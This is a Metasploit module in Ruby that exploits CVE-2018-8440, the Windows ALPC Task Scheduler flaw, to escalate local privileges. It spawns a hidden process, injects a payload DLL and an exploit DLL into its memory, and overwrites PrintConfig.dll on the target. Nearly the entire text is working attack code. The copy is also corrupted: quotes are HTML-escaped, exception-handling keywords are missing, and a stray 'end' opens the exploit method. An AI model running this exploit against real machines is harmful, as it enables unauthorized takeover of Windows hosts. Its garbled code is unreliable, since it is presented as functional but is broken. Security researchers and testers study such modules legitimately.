# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core/post/file&#039;
require &#039;msf/core/post/windows/priv&#039;
require &#039;msf/core/post/windows/registry&#039;         #TODO: Do we need this?
require &#039;msf/core/exploit/exe&#039;

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Microsoft Windows ALPC Task Scheduler Local Privilege Elevation&#039;,
      &#039;Description&#039;    => %q(
        On vulnerable versions of Windows the alpc endpoint method SchRpcSetSecurity implemented
        by the task scheduler service can be used to write arbitrary DACLs to `.job` files located
        in `c:\windows\tasks` because the scheduler does not use impersonation when checking this
        location. Since users can create files in the `c:\windows\tasks` folder, a hardlink can be
        created to a file the user has read access to. After creating a hardlink, the vulnerability
        can be triggered to set the DACL on the linked file.

        WARNING:
        The PrintConfig.dll (%windir%\system32\driverstor\filerepository\prnms003*) on the target host
        will be overwritten when the exploit runs.

        This module has been tested against Windows 10 Pro x64.
      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;SandboxEscaper&#039;,       # Original discovery and PoC
          &#039;bwatters-r7&#039;,          # msf module
          &#039;asoto-r7&#039;,             # msf module
          &#039;Jacob Robles&#039;          # msf module
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [&#039;Windows 10 x64&#039;, { &#039;Arch&#039; => ARCH_X64 }]
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2018-8440&#039;],
          [&#039;URL&#039;, &#039;https://github.com/SandboxEscaper/randomrepo/&#039;],
        ],
      &#039;DisclosureDate&#039; => &#039;Aug 27 2018&#039;,
      &#039;DefaultTarget&#039;  => 0,
    ))

    register_options([OptString.new(&#039;PROCESS&#039;,
        [false, &#039;Name of process to spawn and inject dll into.&#039;, nil])
    ])
  end

  def setup_process(process_name)
    begin
      print_status("Launching #{process_name} to host the exploit...")
      launch_process = client.sys.process.execute(process_name, nil, &#039;Hidden&#039; => true)
      process = client.sys.process.open(launch_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
      # Sandboxes could not allow to create a new process
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_error(&#039;Operation failed. Trying to elevate the current process...&#039;)
      process = client.sys.process.open
    end
    process
  end

  def inject_magic(process, payload_dll)
    library_path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2018-8440&#039;, &#039;ALPC-TaskSched-LPE.dll&#039;)
    library_path = ::File.expand_path(library_path)
    dll_data = &#039;&#039;
    ::File.open(library_path, &#039;rb&#039;) { |f| dll_data = f.read }

    print_status("Writing payload dll into process #{process.pid} memory")
    payload_addr = process.memory.allocate(payload_dll.length, PROT_READ | PROT_WRITE)
    written = process.memory.write(payload_addr, payload_dll)

    if written != payload_dll.length
      fail_with(Failure::UnexpectedReply, &#039;Failed to write payload to process memory&#039;)
    end

    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
    exploit_mem, offset = inject_dll_data_into_process(process, dll_data)
    process.thread.create(exploit_mem + offset, payload_addr)
  end

  def validate_active_host
    sysinfo[&#039;Computer&#039;]
    true
    elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    false
  end

  def validate_target
    if is_system?
      fail_with(Failure::None, &#039;Session is already elevated&#039;)
    end

    if sysinfo[&#039;Architecture&#039;] == ARCH_X86
      fail_with(Failure::NoTarget, &#039;Exploit code is 64-bit only&#039;)
    end

    if sysinfo[&#039;OS&#039;] =~ /XP/
      fail_with(Failure::Unknown, &#039;The exploit binary does not support Windows XP&#039;)
    end
  end

  def exploit
    end

    payload_dll = generate_payload_dll
    process_name = datastore[&#039;PROCESS&#039;] || &#039;notepad.exe&#039;

    print_status(&#039;Checking target...&#039;)
    unless validate_active_host
      raise Msf::Exploit::Failed, &#039;Could not connect to session&#039;
    end
    validate_target

    print_status("Target Looks Good... trying to start #{process_name}")
    process = setup_process(process_name)
    inject_magic(process, payload_dll)
    print_good(&#039;Exploit finished, wait for (hopefully privileged) payload execution to complete.&#039;)
    elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    print_error(e.message)
  end
end

